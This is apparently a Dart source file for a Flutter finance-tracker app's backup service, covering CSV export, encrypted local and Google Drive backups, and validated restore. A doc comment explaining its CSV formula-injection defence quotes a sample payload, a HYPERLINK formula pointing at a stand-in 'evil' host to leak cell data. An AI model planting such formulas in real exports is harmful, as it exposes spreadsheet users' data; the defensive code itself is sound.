import 'dart:convert';
import 'dart:io';

import 'package:csv/csv.dart';
import 'package:flutter/services.dart' show PlatformException;
import 'package:google_sign_in/google_sign_in.dart' as gsi;
import 'package:googleapis/drive/v3.dart' as drive;
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../models/account.dart';
import '../models/budget.dart';
import '../models/expense.dart';
import '../models/investment.dart';
import '../models/recurring_rule.dart';
import '../models/tx_template.dart';
import '../utils/app_logger.dart';
import '../utils/currency_format.dart';
import '../utils/db_constants.dart';
import 'backup_crypto.dart';
import 'db_service.dart';

// Export expenses to CSV

/// Neutralises spreadsheet formula injection in an exported cell.
///
/// Excel and LibreOffice evaluate any cell whose text begins with `=`, `+`,
/// `-`, `@`, a tab, or a carriage return. A transaction described
/// `=HYPERLINK("http://evil/"&A1,"click")` would therefore execute when the
/// export is opened. Prefixing with an apostrophe forces the spreadsheet to
/// treat the value as literal text; the apostrophe itself is not displayed.
///
/// Only [String] cells are at risk — numbers and dates are emitted by the
/// caller as their own types and pass through untouched.
Object? csvSafeCell(Object? value) {
  if (value is! String || value.isEmpty) return value;
  return RegExp(r'^[=+\-@\t\r]').hasMatch(value) ? "'$value" : value;
}

List<List<dynamic>> _expenseCsvRows(List<Expense> expenses) => [
      [
        'ID',
        'Description',
        'Amount',
        'Date',
        'Category',
        'PaymentMode',
        'Type',
        'AccountId',
        'ToAccountId',
        'ToAmount'
      ],
      ...expenses.map((e) => [
            e.id ?? '',
            csvSafeCell(e.description),
            // Export human-readable major units (e.g. 120.50).
            minorToMajor(e.amount).toStringAsFixed(2),
            e.date.toIso8601String(),
            csvSafeCell(e.category),
            csvSafeCell(e.paymentMode),
            e.type,
            e.accountId ?? '',
            e.toAccountId ?? '',
            // Destination-currency amount of a cross-currency transfer.
            e.toAmount == null
                ? ''
                : minorToMajor(e.toAmount!).toStringAsFixed(2),
          ]),
    ];

/// Writes the given expenses to a CSV file and returns it. Callers pass an
/// already-filtered list (e.g. the current month) so users can download
/// exactly what they see.
Future<File> writeExpensesCsvFile(List<Expense> expenses,
    {String filename = 'expenses_export.csv'}) async {
  final csvData = const ListToCsvConverter().convert(_expenseCsvRows(expenses));
  final path = await BackupService()._localPath;
  final file = File('$path/$filename');
  await file.writeAsString(csvData);
  return file;
}

Future<File> exportExpensesToCsv() async {
  final expenses = await DBService().getExpenses();
  return writeExpensesCsvFile(expenses);
}

// Export investments to CSV

Future<File> exportInvestmentsToCsv() async {
  final investments = await DBService().getInvestments();
  final List<List<dynamic>> rows = [
    ['ID', 'Name', 'Amount', 'Date', 'Type'],
    ...investments.map((i) => [
          i.id ?? '',
          csvSafeCell(i.name),
          minorToMajor(i.amount).toStringAsFixed(2),
          i.date.toIso8601String(),
          csvSafeCell(i.type),
        ]),
  ];
  String csvData = const ListToCsvConverter().convert(rows);
  final backupService = BackupService();
  final path = await backupService._localPath;
  final file = File('$path/investments_export.csv');
  await file.writeAsString(csvData);
  return file;
}

/// Raised when a Google Drive operation can't proceed. Carries a
/// user-friendly [message]; the underlying Google Sign-In failures surface as
/// cryptic codes (e.g. `ApiException: 10`) that mean nothing to a user.
class DriveBackupException implements Exception {
  final String message;
  DriveBackupException(this.message);
  @override
  String toString() => message;
}

/// Raised when a file offered for restore isn't a backup at all (wrong JSON
/// shape, a renamed CSV, a truncated download). Restoring clears the database
/// first, so this must be caught *before* anything is wiped.
class BackupFormatException implements Exception {
  final String message;
  BackupFormatException(this.message);
  @override
  String toString() => message;
}

/// Raised when a backup parses correctly but contains no rows in any table.
/// Applying it would silently wipe every transaction, so the caller must
/// confirm with the user and retry with `allowEmpty: true`.
class EmptyBackupException implements Exception {
  final String message;
  EmptyBackupException(this.message);
  @override
  String toString() => message;
}

class BackupService {
  final gsi.GoogleSignIn _googleSignIn = gsi.GoogleSignIn(
    scopes: [
      drive.DriveApi.driveFileScope,
      drive.DriveApi.driveAppdataScope,
    ],
  );

  /// Translates a Google Sign-In [PlatformException] into a message the user
  /// can act on. The most common failure is `ApiException: 10`
  /// (DEVELOPER_ERROR): the build has no OAuth client registered for this
  /// package name + signing-certificate SHA-1, so Google rejects the sign-in.
  /// That's a one-time build/Cloud setup — it can't be fixed on the device —
  /// so we steer the user to the local backups, which always work.
  String _driveSignInMessage(PlatformException e) {
    final detail = (e.message ?? '').toLowerCase();
    final isDeveloperError = detail.contains('apiexception: 10') ||
        detail.contains('developer_error');
    if (e.code == 'sign_in_failed' && isDeveloperError) {
      return 'Google Drive backup is not set up for this build, so Google '
          'rejected the sign-in. Your data is safe — use "Backup locally '
          '(JSON)" or the encrypted backup below instead. (Enabling Drive '
          'needs a one-time Google Cloud sign-in setup; see '
          'docs/GOOGLE_DRIVE_SETUP.md.)';
    }
    if (e.code == 'network_error') {
      return 'Could not reach Google to sign in. Check your connection and '
          'try again, or use a local/encrypted backup below.';
    }
    if (e.code == 'sign_in_canceled') {
      return 'Google sign-in was cancelled.';
    }
    return 'Google sign-in failed (${e.code}). Your data is safe — use a '
        'local or encrypted backup below.';
  }

  Future<String> get _localPath async {
    final directory = await getApplicationDocumentsDirectory();
    return directory.path;
  }

  static const _kLastBackup = 'last_backup_time';
  static const _kLastAutoBackup = 'last_auto_backup_time';

  Future<File> get _backupFile async {
    final path = await _localPath;
    return File('$path/finance_backup.json');
  }

  Future<File> get _encryptedBackupFile async {
    final path = await _localPath;
    return File('$path/finance_backup_encrypted.json');
  }

  /// When the most recent backup (local, auto, or Drive) was taken.
  Future<DateTime?> lastBackupTime() async {
    final prefs = await SharedPreferences.getInstance();
    final raw = prefs.getString(_kLastBackup);
    return raw == null ? null : DateTime.tryParse(raw);
  }

  Future<void> _markBackedUp() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_kLastBackup, DateTime.now().toIso8601String());
  }

  /// Writes a local backup at most once per [minInterval] to protect against
  /// data loss when users forget to back up manually. Safe to call on launch.
  /// When at-rest database encryption is enabled, the backup is encrypted
  /// with the same device-held key so it doesn't leave a readable copy of
  /// the data on disk.
  Future<bool> autoBackupIfDue(
      {Duration minInterval = const Duration(days: 1)}) async {
    final prefs = await SharedPreferences.getInstance();
    final raw = prefs.getString(_kLastAutoBackup);
    final last = raw == null ? null : DateTime.tryParse(raw);
    if (last != null && DateTime.now().difference(last) < minInterval) {
      return false;
    }
    // This runs unguarded during launch, so it must not throw. If the device
    // key is unavailable while encryption is on, skip the backup rather than
    // fall back to writing a plaintext copy of everything.
    final String? deviceKey;
    try {
      deviceKey = await DBService().deviceKeyIfEncrypted();
    } catch (e) {
      AppLogger.error(
          'Skipping auto-backup: database encryption is on but its key could '
          'not be read, and an unencrypted backup would defeat it',
          e);
      return false;
    }
    await backupToJson(deviceKey: deviceKey);
    await prefs.setString(
        _kLastAutoBackup, DateTime.now().toIso8601String());
    return true;
  }

  /// Writes the full-data JSON backup and returns the file so it can be
  /// shared/downloaded by the user.
  ///
  /// When at-rest database encryption is on the file is written as an
  /// encrypted envelope, exactly like the auto-backup — otherwise this path
  /// would drop a readable copy of every transaction on disk (and hand it to
  /// the share sheet) the moment the user tapped "Backup locally". Use
  /// [writeEncryptedBackup] for a copy that can be restored on another device.
  Future<File> writeJsonBackupFile() async {
    await backupToJson(deviceKey: await DBService().deviceKeyIfEncrypted());
    return _backupFile;
  }

  /// Assembles the full-data backup map shared by plain and encrypted backups.
  Future<Map<String, dynamic>> _collectBackupData() async {
    final expenses = await DBService().getExpenses();
    final investments = await DBService().getInvestments();
    final budgets = await DBService().getBudgets();
    final accounts = await DBService().getAccounts();
    final recurringRules = await DBService().getRecurringRules();
    final templates = await DBService().getTemplates();
    return {
      // v4: amounts are integer minor units (paise/cents).
      // v5: transfer rows may carry toAmount (destination-currency amount).
      'version': 5,
      'expenses': expenses.map((e) => e.toMap()).toList(),
      'investments': investments.map((i) => i.toMap()).toList(),
      'budgets': budgets.map((b) => b.toMap()).toList(),
      'accounts': accounts.map((a) => a.toMap()).toList(),
      'recurring_rules': recurringRules.map((r) => r.toMap()).toList(),
      'templates': templates.map((t) => t.toMap()).toList(),
    };
  }

  /// Writes the full-data backup to the local backup file — plaintext, or as
  /// an encrypted envelope when [deviceKey] is given (used by the auto-backup
  /// when at-rest database encryption is on).
  Future<void> backupToJson({String? deviceKey}) async {
    final data = await _collectBackupData();
    var content = jsonEncode(data);
    if (deviceKey != null) {
      content = await BackupCrypto.encryptString(content, deviceKey);
    }
    final file = await _backupFile;
    await file.writeAsString(content);
    await _markBackedUp();
  }

  /// Writes a passphrase-encrypted full-data backup and returns the file so it
  /// can be shared. The passphrase is not stored anywhere.
  Future<File> writeEncryptedBackup(String passphrase) async {
    final data = await _collectBackupData();
    final envelope =
        await BackupCrypto.encryptString(jsonEncode(data), passphrase);
    final file = await _encryptedBackupFile;
    await file.writeAsString(envelope);
    await _markBackedUp();
    return file;
  }

  /// Restores from the local encrypted backup. Throws on a wrong passphrase or
  /// corrupt/missing file.
  Future<void> restoreFromEncryptedFile(String passphrase,
      {bool clearBeforeRestore = true, bool allowEmpty = false}) async {
    final file = await _encryptedBackupFile;
    if (!await file.exists()) {
      throw Exception('No encrypted backup found on this device');
    }
    final envelope = await file.readAsString();
    final plain = await BackupCrypto.decryptString(envelope, passphrase);
    await _applyRestore(jsonDecode(plain),
        clearBeforeRestore: clearBeforeRestore, allowEmpty: allowEmpty);
  }

  Future<void> restoreFromJson(
      {bool clearBeforeRestore = true,
      String? deviceKey,
      bool allowEmpty = false}) async {
    final file = await _backupFile;
    if (!await file.exists()) return;
    var content = await file.readAsString();
    // Auto-backups taken while database encryption is on are stored as an
    // encrypted envelope; decrypt with the same device-held key.
    if (BackupCrypto.isEncrypted(content)) {
      deviceKey ??= await DBService().deviceKeyIfEncrypted();
      if (deviceKey == null) {
        throw Exception(
            'This backup is encrypted with the device key, which is no '
            'longer available. Enable database encryption or use a '
            'passphrase-encrypted backup instead.');
      }
      content = await BackupCrypto.decryptString(content, deviceKey);
    }
    await _applyRestore(jsonDecode(content),
        clearBeforeRestore: clearBeforeRestore, allowEmpty: allowEmpty);
  }

  /// The table keys a backup payload carries, in the order they are restored.
  static const _backupTableKeys = [
    'accounts',
    'expenses',
    'investments',
    'budgets',
    'recurring_rules',
    'templates',
  ];

  /// Throws [BackupFormatException] unless [data] is shaped like a backup.
  ///
  /// Restoring wipes the database before inserting, so every failure mode has
  /// to be caught here rather than part-way through. Previously `data['version']`
  /// was indexed straight off a `dynamic`, so a JSON file that wasn't an object
  /// (a renamed CSV, say) surfaced as a raw `NoSuchMethodError`.
  static void _validateBackupPayload(dynamic data) {
    if (data is! Map) {
      throw BackupFormatException(
          'That file is not a Finance Tracker backup — expected a JSON object, '
          'found ${data is List ? 'a list' : 'a ${data.runtimeType}'}.');
    }
    final version = data['version'];
    if (version != null && version is! num) {
      throw BackupFormatException(
          'That backup has an unreadable version field, so it may be corrupt.');
    }
    for (final key in _backupTableKeys) {
      final table = data[key];
      if (table != null && table is! List) {
        throw BackupFormatException(
            'That backup is corrupt: "$key" should be a list of rows.');
      }
    }
  }

  /// Validates the backup payload, converts it to row maps, and applies it in
  /// one database transaction: a malformed backup or an interruption rolls
  /// back, leaving the existing data untouched.
  ///
  /// Set [allowEmpty] only after the user has confirmed they really mean to
  /// replace their data with an empty backup.
  Future<void> _applyRestore(dynamic data,
      {bool clearBeforeRestore = true, bool allowEmpty = false}) async {
    _validateBackupPayload(data);

    if (clearBeforeRestore && !allowEmpty) {
      final totalRows = _backupTableKeys.fold<int>(
          0, (sum, key) => sum + ((data[key] as List?)?.length ?? 0));
      if (totalRows == 0) {
        throw EmptyBackupException(
            'That backup contains no transactions, accounts, or budgets. '
            'Restoring it would erase everything currently in the app.');
      }
    }

    // Backups before v4 stored amounts as major-unit doubles; convert them
    // to integer minor units so they match the current storage.
    final legacyAmounts = ((data['version'] ?? 0) as num) < 4;
    Map<String, dynamic> fix(dynamic raw, List<String> amountKeys) {
      final map = Map<String, dynamic>.from(raw);
      if (legacyAmounts) {
        for (final key in amountKeys) {
          if (map[key] is num) {
            map[key] = ((map[key] as num) * 100).round();
          }
        }
      }
      return map;
    }

    // Parse every row through its model BEFORE touching the database, so a
    // corrupt backup fails cleanly. Older backups lack some keys (accounts,
    // budgets, …); those tables simply restore empty. Ids are preserved
    // because toMap includes them, keeping account links intact.
    final rowsByTable = <String, List<Map<String, Object?>>>{
      DbConstants.tableAccounts: [
        for (final a in data['accounts'] ?? [])
          Account.fromMap(fix(a, [DbConstants.colOpeningBalance])).toMap(),
      ],
      DbConstants.tableExpenses: [
        for (final e in data['expenses'] ?? [])
          Expense.fromMap(fix(e, [DbConstants.colAmount])).toMap(),
      ],
      DbConstants.tableInvestments: [
        for (final i in data['investments'] ?? [])
          Investment.fromMap(fix(i, [DbConstants.colAmount])).toMap(),
      ],
      DbConstants.tableBudgets: [
        for (final b in data['budgets'] ?? [])
          Budget.fromMap(fix(b, [DbConstants.colAmount])).toMap(),
      ],
      DbConstants.tableRecurringRules: [
        for (final r in data['recurring_rules'] ?? [])
          RecurringRule.fromMap(fix(r, [DbConstants.colAmount])).toMap(),
      ],
      DbConstants.tableTemplates: [
        for (final t in data['templates'] ?? [])
          TxTemplate.fromMap(fix(t, [DbConstants.colAmount])).toMap(),
      ],
    };

    await DBService()
        .replaceAllData(rowsByTable, clearFirst: clearBeforeRestore);
  }

  Future<drive.DriveApi> _getDriveApi() async {
    gsi.GoogleSignInAccount? account;
    try {
      account =
          await _googleSignIn.signInSilently() ?? await _googleSignIn.signIn();
    } on PlatformException catch (e) {
      // Turn the raw ApiException codes into an actionable message.
      throw DriveBackupException(_driveSignInMessage(e));
    }
    if (account == null) {
      throw DriveBackupException('Google sign-in was cancelled.');
    }
    final authHeaders = await account.authHeaders;
    final client = _GoogleAuthClient(authHeaders);
    return drive.DriveApi(client);
  }

  Future<void> backupToDrive() async {
    final driveApi = await _getDriveApi();
    // Encrypt with the device key when at-rest encryption is on, matching
    // autoBackupIfDue. Without this the Drive copy went up as plaintext *and*
    // overwrote the encrypted local auto-backup, since both share _backupFile.
    await backupToJson(deviceKey: await DBService().deviceKeyIfEncrypted());
    final file = await _backupFile;
    final length = await file.length();

    // Update the existing Drive copy in place (instead of creating a new
    // file on every backup, which used to pile up copies in the app-data
    // folder forever). Any stale duplicates from old versions are removed
    // after a successful upload.
    final existing = await driveApi.files.list(
      spaces: 'appDataFolder',
      q: "name = 'finance_backup.json' and trashed = false",
      orderBy: 'modifiedTime desc',
      $fields: 'files(id)',
    );
    final existingFiles = existing.files ?? const <drive.File>[];

    if (existingFiles.isEmpty) {
      await driveApi.files.create(
        drive.File()
          ..name = 'finance_backup.json'
          ..parents = ['appDataFolder'],
        uploadMedia: drive.Media(file.openRead(), length),
      );
    } else {
      await driveApi.files.update(
        drive.File()..name = 'finance_backup.json',
        existingFiles.first.id!,
        uploadMedia: drive.Media(file.openRead(), length),
      );
      for (final stale in existingFiles.skip(1)) {
        final id = stale.id;
        if (id == null) continue;
        try {
          await driveApi.files.delete(id);
        } catch (e) {
          AppLogger.error('Failed to delete stale Drive backup', e);
        }
      }
    }

    // Update last sync time
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_kLastBackup, DateTime.now().toIso8601String());
  }

  /// Checks if the remote backup is newer than the last local backup.
  /// Returns true if remote is newer, false otherwise.
  Future<bool> isRemoteBackupNewer() async {
    try {
      final driveApi = await _getDriveApi();
      final fileList = await driveApi.files.list(
        spaces: 'appDataFolder',
        q: "name = 'finance_backup.json' and trashed = false",
        orderBy: 'modifiedTime desc',
        pageSize: 1,
        $fields: 'files(id, modifiedTime)',
      );

      if (fileList.files == null || fileList.files!.isEmpty) {
        return false; // No remote backup exists
      }

      final remoteFile = fileList.files!.first;
      if (remoteFile.modifiedTime == null) return false;

      final prefs = await SharedPreferences.getInstance();
      final lastBackupStr = prefs.getString(_kLastBackup);

      if (lastBackupStr == null) {
        // We have never backed up from this device, but a remote file exists.
        // Remote is definitely "newer" (or at least unknown).
        return true;
      }

      final lastLocalBackupTime = DateTime.parse(lastBackupStr);
      // Drive returns UTC time
      return remoteFile.modifiedTime!.isAfter(lastLocalBackupTime);
    } catch (e) {
      // If we can't check, assume false to avoid blocking the user,
      // but log the error.
      AppLogger.error('Error checking remote backup', e);
      return false;
    }
  }

  Future<void> restoreFromDrive({bool allowEmpty = false}) async {
    final driveApi = await _getDriveApi();
    final fileList = await driveApi.files.list(
      spaces: 'appDataFolder',
      q: "name = 'finance_backup.json' and trashed = false",
      orderBy: 'modifiedTime desc',
      pageSize: 1,
    );

    if (fileList.files == null || fileList.files!.isEmpty) {
      throw Exception('No Drive backup found');
    }

    final fileId = fileList.files!.first.id;
    if (fileId == null) {
      throw Exception('Invalid backup file id');
    }

    final media = await driveApi.files.get(
      fileId,
      downloadOptions: drive.DownloadOptions.fullMedia,
    ) as drive.Media;

    // Download to a temp file first. Streaming straight over _backupFile
    // destroyed the user's local safety-net backup before we knew the remote
    // payload was even usable — a truncated download then left them with
    // neither. Validate, then swap.
    final target = await _backupFile;
    final temp = File('${target.path}.download');
    try {
      final sink = temp.openWrite();
      await media.stream.pipe(sink);
      await sink.flush();
      await sink.close();

      // Parse (and decrypt, if this is a device-key envelope) before the
      // local backup is touched, so a corrupt download fails harmlessly.
      var content = await temp.readAsString();
      if (BackupCrypto.isEncrypted(content)) {
        final deviceKey = await DBService().deviceKeyIfEncrypted();
        if (deviceKey == null) {
          throw Exception(
              'The Drive backup is encrypted with this device\'s key, which '
              'is no longer available. Enable database encryption on this '
              'device, or restore from a passphrase-encrypted backup.');
        }
        content = await BackupCrypto.decryptString(content, deviceKey);
      }
      final data = jsonDecode(content);
      _validateBackupPayload(data);

      // Restore first, adopt second. If the restore throws — corrupt rows, or
      // an unconfirmed empty backup — the local backup is still the user's own
      // last good copy rather than whatever came down from Drive.
      await _applyRestore(data,
          clearBeforeRestore: true, allowEmpty: allowEmpty);
      await temp.rename(target.path);
    } finally {
      if (await temp.exists()) {
        try {
          await temp.delete();
        } catch (e) {
          AppLogger.error('Failed to clean up partial Drive download', e);
        }
      }
    }
  }
}

class _GoogleAuthClient extends http.BaseClient {
  final Map<String, String> _headers;
  final http.Client _client = http.Client();

  _GoogleAuthClient(this._headers);

  @override
  Future<http.StreamedResponse> send(http.BaseRequest request) {
    return _client.send(request..headers.addAll(_headers));
  }
}
